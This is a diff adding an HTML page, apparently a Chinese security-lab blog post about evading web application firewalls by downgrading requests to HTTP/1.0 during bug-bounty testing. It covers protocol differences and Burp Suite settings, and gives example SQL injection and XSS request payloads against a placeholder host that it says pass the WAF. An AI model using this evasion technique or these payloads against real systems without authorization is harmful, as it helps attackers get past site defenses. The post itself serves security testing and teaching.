@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTTP/1.0 绕过WAF — DARKSEC</title>
+<meta name="description" content="利用HTTP版本解析差异绕过现代WAF检测">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐱</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> 🐱</a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ WAF绕过 / 协议层</div>
+        <h1>HTTP/1.0 协议降级绕过WAF</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-05</span>
+          <span>⏱ 8 min read</span>
+          <span>🏷 WAF绕过 / HTTP</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">概述</a></li>
+            <li><a href="#principle">原理分析</a></li>
+            <li><a href="#burp">Burp配置</a></li>
+            <li><a href="#cases">实战案例</a></li>
+            <li><a href="#tips">注意事项</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">概述</h2>
+        <p>在SRC漏洞挖掘中，经常会遇到WAF拦截的情况。当现代WAF对HTTP/1.1的检测越来越严格时，回退到HTTP/1.0有时能绕过部分解析差异，从而绕过WAF的检测规则。</p>
+
+        <blockquote>
+          <p>🐱 猫猫提示：有时候"老办法"反而更有效哦~ 就像猫咪喜欢钻纸箱一样</p>
+        </blockquote>
+
+        <h2 id="principle">原理分析</h2>
+        <p>HTTP/1.0和HTTP/1.1的主要差异：</p>
+        
+        <h3>1. Host头处理</h3>
+        <pre><code># HTTP/1.0 不要求Host头
+GET /path HTTP/1.0
+
+# HTTP/1.1 必须有Host头
+GET /path HTTP/1.1
+Host: example.com</code></pre>
+
+        <h3>2. 连接方式</h3>
+        <pre><code># HTTP/1.0 默认短连接
+Connection: close
+
+# HTTP/1.1 默认长连接
+Connection: keep-alive</code></pre>
+
+        <h3>3. 分块传输</h3>
+        <p>HTTP/1.1支持<code>Transfer-Encoding: chunked</code>，而HTTP/1.0不支持。WAF可能只检查HTTP/1.1的分块编码。</p>
+
+        <h2 id="burp">Burp配置</h2>
+        <p>在Burp Suite中修改协议版本：</p>
+
+        <h3>方法1：Repeater修改</h3>
+        <pre><code># 原始请求
+GET /api/search?q=test HTTP/1.1
+Host: target.com
+
+# 修改为
+GET /api/search?q=test HTTP/1.0
+Host: target.com</code></pre>
+
+        <h3>方法2：全局配置</h3>
+        <pre><code>Project Options → Connections → HTTP
+→ 勾选 "Use HTTP/1.0 for outgoing connections"</code></pre>
+
+        <h2 id="cases">实战案例</h2>
+
+        <h3>案例1：SQLi绕过</h3>
+        <pre><code># HTTP/1.1 被拦截
+GET /search?q=1' OR '1'='1 HTTP/1.1
+Host: target.com
+→ 返回 403 Forbidden
+
+# HTTP/1.0 绕过
+GET /search?q=1' OR '1'='1 HTTP/1.0
+Host: target.com
+→ 返回 200 OK，注入成功</code></pre>
+
+        <h3>案例2：XSS绕过</h3>
+        <pre><code># HTTP/1.1 被拦截
+GET /page?name=<script>alert(1)</script> HTTP/1.1
+Host: target.com
+→ WAF拦截
+
+# HTTP/1.0 绕过
+GET /page?name=<script>alert(1)</script> HTTP/1.0
+Host: target.com
+→ XSS触发</code></pre>
+
+        <h2 id="tips">注意事项</h2>
+        <ul>
+          <li>不是所有WAF都受影响，需要实际测试</li>
+          <li>某些CDN可能会将HTTP/1.0转换为HTTP/1.1</li>
+          <li>可以结合其他绕过技术（编码、分块等）一起使用</li>
+          <li>记录成功的payload和场景，积累经验</li>
+        </ul>
+
+        <div class="article-tags">
+          <span class="tag yellow">WAF绕过</span>
+          <span class="tag">HTTP</span>
+          <span class="tag">SRC</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB 🐾</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
